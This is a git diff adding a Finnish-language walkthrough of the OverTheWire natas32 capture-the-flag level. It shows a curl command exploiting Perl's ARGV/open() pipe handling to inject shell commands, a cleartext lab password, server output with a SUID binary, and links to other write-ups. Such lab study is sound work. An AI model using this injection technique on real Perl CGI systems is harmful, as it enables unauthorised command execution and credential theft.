@@ -871,9 +871,132 @@ Entä jos `./getpassword` ja ilman %`20|` ei toimi näkyvästi?
 </html>
 ```
 
+tämä on muu pohja testaus, mutta testattu ja ei pelittänyt, että fail ja hyvä testata ja harjoitus komento.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST "http://natas32.natas.labs.overthewire.org/index.pl?cat%20%2Fetc%2Fnatas_webpass%2Fnatas33%20%7C" \
+  -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B \
+  -F 'file=ARGV' \
+  -F 'file=@/home/kali/Downloads/Book1.csv;type=text/csv' \
+  -F 'submit=Upload'
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
 
 
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
 
+## miniyhteenveto - 1
+
+Tässä natas32:ssa on sama idea kuin natas31-tasossa, mutta tässä on vähän paranneltu versio.
+
+Mikä idea tässä oli?
+Käytetään samaa Excel-taulukkoa – sisältö voi olla mitä tahansa, esim. pari satunnaista riviä, tekstiä tai kirjainta. Syötetään `curl`-komentoa, jolla testataan natas32:n URL:ia ja lähetetään se taulukko mukaan. URL:iin oletuksena tulee polku: `http://natas32.natas.labs.overthewire.org/index.pl?` - Tähän perään käytetään Linux-tyyppistä komentoa kuten `ls`, jotta nähdään hakemiston sisältö.
+
+
+Tulostettuna näkyy hakemisto, ja sieltä löytyy tiedosto `getpassword`, jolla on `SUID`-bit (rws), eli se voidaan suorittaa root-oikeuksin. Tämän kautta haetaan **natas33-tason salasana**, joka sijaitsee binäärin kautta luettavassa tiedostossa.
+
+Siksi tullaan syöttää tällainen URL parametrin injektio hyökkäys `http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|` + ja mukaan excel taulukko filu ja näin ollen saadaan se salasanansa.
+
+
+```
+<table class="sortable table table-hover table-striped"><tr><th>.:
+</th></tr><tr><td>total 156
+</td></tr><tr><td>drwxr-x--- 5 natas32 natas32  4096 Aug 15 13:06 bootstrap-3.3.6-dist
+</td></tr><tr><td>-rwsrwx--- 1 root    natas32 16096 Aug 15 13:06 getpassword
+</td></tr><tr><td>-rw-r--r-- 1 root    root     9740 Aug 15 13:06 index-source.html
+</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32  2968 Aug 15 13:06 index.pl
+</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 97180 Aug 15 13:06 jquery-1.12.3.min.js
+</td></tr><tr><td>-r-xr-x--- 1 natas32 natas32 16877 Aug 15 13:06 sorttable.js
+</td></tr><tr><td>drwxr-x--- 2 natas32 natas32  4096 Sep 14 13:03 tmp
+</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+
+```
+
+## miniyhteenveto - 2
+
+Koskien tätä natas32 tehtävää ja harjoitusta. Tässä natas32 tapahtuu periaatteessa sama ideana kuin natas31:ssä, mutta vain curl komennolla ja/tai käyttää kali linux **burp suite** ohjelma/työkalulla ja käyttäen sitä POST URL:in parametri menetelmää ja mukaan lukien **ARGV** kontekstiin, jota käytetään Perl-ohjelmissa komentoriviparametrien välittämiseen.
+
+
+Taustalla oleva Perl-skripti käyttää `open()`-funktiota lukemaan tiedostoja, mutta se lukee @ARGV-listan kautta eli komentorivillä annetuista parametreista.
+
+- Tätä voidaan kuin "huijata" järjestelmää syöttämällä oman "tiedostolistamme" ARGV:n kautta – eli käytännössä lähettämällä POST-pyynnössä ylimääräisen tiedoston uusiksi.
+
+**Burp suite** ohjelman alla tai curl koemnnolla lähetettään POST-pyyntöä osoitteeseen url perässä kuin `/index.pl` URL loppuun lisäämällä parametrin ja tämä on esim.
+
+```
+/index.pl?ls%20.|
+```
+
+Tämä toimii vain jos koko syöte osuu siihen `open()`-kutsuun, eli ensimmäinen tiedosto käytännössä kertoo mitä komentoa suoritetaan.
+
+Muuta poikkeamia mietittykin mm.
+- jos testaisi normaalisti URL sivuston kautta niin se ei pelittäisi koska tarvittaan virallinen excel taulukko ja suorittaa POST pyyntö samanaikaisesti.
+- Entä jos F12 kautta developer tool työkalujen kautta suorittaa POST pyynnön, jossa lähetäisi tiedoston eli excel talukonsa? 
+   - vastaus: ei, ei kunnolla koska tämä tapahtuisi uusi **multipart/form-data** POST-pyynnöllä ja jossa kuuluu tiedostoliite eli excel taulukko tiedosto.
+   - F12:sta voi vain katsoa ja toistaa jo tehtyjä pyyntöjä, mutta ei luoda uusia "liitä tämä tiedosto mukaan" -tyylisiä pyyntöjä.
+
+
+## linkejä ja apua ja teorioita
+
+https://www.youtube.com/watch?v=KirvNW1FlNo
+
+
+https://anyafachri.medium.com/perl-ultimate-vulnerability-in-cgi-opening-pipes-part-ii-natas32-overthewire-write-up-b3cdf6efe220
+
+
+https://miaxu-src.github.io/natas/2021/09/19/natas32-walkthrough.html
 
 
 
